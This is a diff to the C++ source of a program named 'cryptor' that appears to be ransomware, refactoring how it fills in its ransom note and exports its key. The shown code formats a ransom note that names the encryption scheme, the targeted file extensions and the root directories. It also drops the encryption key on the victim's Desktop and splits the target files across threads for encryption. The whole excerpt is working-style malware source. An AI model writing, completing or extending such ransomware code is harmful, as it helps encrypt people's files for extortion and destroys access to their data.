@@ -94,7 +94,8 @@ void cryptor::Main::dropRansomNote(
 	//Do placeholder replacement ({fmt} does not want to cooperate)
 	std::string ransomNoteFormatted = std::regex_replace(ransomNote, std::regex("%encryption_scheme%"), common::io::CryptorEngine::CIPHER_ALGO);
 	ransomNoteFormatted = std::regex_replace(ransomNoteFormatted, std::regex("%keypair_type%"), common::io::CryptorEngine::KEY_TYPE);
-	ransomNoteFormatted = std::regex_replace(ransomNoteFormatted, std::regex("%public_key_fingerprint%"), cEngine.pubkeyFingerprint());
+	ransomNoteFormatted = std::regex_replace(ransomNoteFormatted, std::regex("%key_fingerprint%"), cEngine.keyFingerprint());
+	ransomNoteFormatted = std::regex_replace(ransomNoteFormatted, std::regex("%chunk_size%"), std::to_string(cEngine.getChunkSize()));
 	ransomNoteFormatted = std::regex_replace(ransomNoteFormatted, std::regex("%target_extensions%"), common::utils::Container::vecStr(common::targets::Extensions::encryptable));
 	ransomNoteFormatted = std::regex_replace(ransomNoteFormatted, std::regex("%root_directories%"), common::utils::Container::vecPathStr(roots));
 	ransomNoteFormatted = std::regex_replace(ransomNoteFormatted, std::regex("%encrypted_extension%"), common::Settings::ENCRYPTED_EXTENSION);
@@ -122,9 +123,9 @@ std::vector<fs::path> cryptor::Main::encrypt(const fs::path& homeFolder, const s
 	}
 
 	//Drop the encryption key to the desktop
-	std::string keyName = std::regex_replace(common::Settings::ENCRYPTION_KEY_NAME, std::regex("%pubkeyFingerprint%"), cryptorEngine.pubkeyFingerprint());
+	std::string keyName = std::regex_replace(common::Settings::ENCRYPTION_KEY_NAME, std::regex("%keyFingerprint%"), cryptorEngine.keyFingerprint());
 	fs::path encryptionKeyPath = homeFolder / "Desktop" / keyName;
-	cryptorEngine.exportPrivkey(encryptionKeyPath);
+	cryptorEngine.exportKey(encryptionKeyPath);
 
 	//Shard the targets vector x ways
 	std::map<uint32_t, std::vector<fs::path>> shards = common::utils::Container::shardVector(hunter.getTargets(), common::Settings::ENCRYPTION_THREADS);
